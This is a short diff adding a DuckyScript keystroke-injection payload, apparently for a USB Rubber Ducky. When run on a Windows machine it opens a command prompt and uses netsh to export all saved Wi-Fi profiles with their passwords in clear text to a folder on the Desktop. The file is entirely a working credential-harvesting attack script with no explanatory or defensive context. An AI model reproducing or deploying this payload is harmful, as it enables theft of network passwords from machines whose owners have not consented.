@@ -1,0 +1,6 @@
+DELAY 750
+GUI r
+DELAY 750
+STRING cmd /C md "%USERPROFILE%\Desktop"\wifiexport & netsh wlan export profile folder="%USERPROFILE%\Desktop"\wifiexport\ key=clear
+ENTER
+DELAY 750
